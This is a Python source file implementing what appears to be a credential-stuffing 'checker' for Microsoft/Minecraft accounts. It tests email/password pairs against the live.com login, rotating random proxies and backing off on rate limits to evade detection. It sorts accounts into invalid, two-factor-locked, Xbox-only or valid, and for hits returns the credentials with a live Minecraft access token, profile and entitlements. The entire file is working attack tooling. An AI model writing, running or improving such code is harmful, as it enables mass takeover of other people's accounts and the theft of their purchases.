import requests
import re
import random
import time
import urllib3
from urllib.parse import urlparse, parse_qs

# Custom Exceptions
class InvalidCredentialsError(Exception): pass
class TwoFactorAuthError(Exception): pass
class APIError(Exception): pass
class ValidMail(Exception): pass

SFTTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

class APIClient:
    def __init__(self, config, proxies, proxy_type, stats):
        self.config = config
        self.proxies = proxies
        self.proxy_type = proxy_type
        self.stats = stats
        # Safe access to config with a fallback value, as recommended.
        self.max_retries = self.config.getint('Settings', 'MaxRetries', fallback=5)
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def _get_proxy_dict(self):
        if not self.proxies or self.proxy_type == 'none':
            return None
        try:
            proxy = random.choice(self.proxies)
            return {
                'http': f'{self.proxy_type}://{proxy}',
                'https': f'{self.proxy_type}://{proxy}'
            }
        except IndexError:
            return None

    def _request_with_retries(self, session, method, url, **kwargs):
        for attempt in range(self.max_retries):
            try:
                # Get a new proxy for each attempt
                proxy_dict = self._get_proxy_dict()
                response = session.request(method, url, proxies=proxy_dict, timeout=15, verify=False, **kwargs)
                if response.status_code not in [429, 503]: # 503 Service Unavailable is also a retryable error
                    return response
                # If we get a rate limit or temp error, log it and wait
                self.stats.increment('retries')
                time.sleep(3 * (attempt + 1)) # Exponential backoff
            except (requests.exceptions.ProxyError, requests.exceptions.SSLError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout) as e:
                self.stats.increment('retries')
                if attempt == self.max_retries - 1:
                    raise APIError(f"Failed after {self.max_retries} retries due to connection issues.") from e
            except requests.exceptions.RequestException as e:
                # Catch other request exceptions but don't retry unless it's a known transient issue
                raise APIError(f"An unexpected network error occurred: {e}") from e
        raise APIError(f"Failed after {self.max_retries} retries (likely due to rate limiting)")

    def check_account(self, email, password):
        with requests.Session() as session:
            session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            
            r = self._request_with_retries(session, 'get', SFTTAG_URL)
            sfttag_match = re.search('sFTTag.*value="(.*)"', r.text)
            url_post_match = re.search("urlPost:'(.+?)'", r.text)
            if not sfttag_match or not url_post_match:
                raise APIError("Could not parse login page (sfttag/urlPost)")
            sfttag = sfttag_match.group(1)
            url_post = url_post_match.group(1)

            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sfttag}
            r = self._request_with_retries(session, 'post', url_post, data=data, allow_redirects=True)

            if any(s in r.text.lower() for s in ["password is incorrect", r"that microsoft account doesn't exist"]):
                raise InvalidCredentialsError()
            if any(s in r.url for s in ["recover?mkt", "identity/confirm", "Abuse?mkt="]):
                raise TwoFactorAuthError()

            access_token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            if not access_token:
                raise InvalidCredentialsError("Could not get access token from redirect (check credentials)")

            auth_r = self._request_with_retries(session, 'post', 'https://user.auth.xboxlive.com/user/authenticate', json={
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": access_token},
                "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
            })
            auth_json = auth_r.json()
            xbox_token = auth_json.get('Token')
            uhs = auth_json.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
            if not xbox_token or not uhs:
                raise APIError("Failed to get Xbox token or UHS")

            xsts_r = self._request_with_retries(session, 'post', 'https://xsts.auth.xboxlive.com/xsts/authorize', json={
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
            })
            xsts_token = xsts_r.json().get('Token')
            if not xsts_token:
                raise ValidMail("Account owns Xbox Live but not Minecraft")

            mc_r = self._request_with_retries(session, 'post', 'https://api.minecraftservices.com/authentication/login_with_xbox',
                                         json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"})
            mc_token = mc_r.json().get('access_token')
            if not mc_token:
                raise APIError("Failed to get Minecraft token")

            ent_r = self._request_with_retries(session, 'get', 'https://api.minecraftservices.com/entitlements/mcstore',
                                         headers={'Authorization': f'Bearer {mc_token}'})
            
            entitlements = [item['name'] for item in ent_r.json().get('items', [])]
            if not entitlements:
                raise ValidMail("Account owns Xbox Live but not Minecraft (no entitlements)")

            prof_r = self._request_with_retries(session, 'get', 'https://api.minecraftservices.com/minecraft/profile',
                                         headers={'Authorization': f'Bearer {mc_token}'})
            profile = prof_r.json()
            if 'id' not in profile:
                raise APIError(f"Could not get profile: {profile.get('errorMessage', 'Unknown error')}")

            return {
                "email": email, "password": password, "mc_token": mc_token,
                "profile": profile, "entitlements": entitlements
            }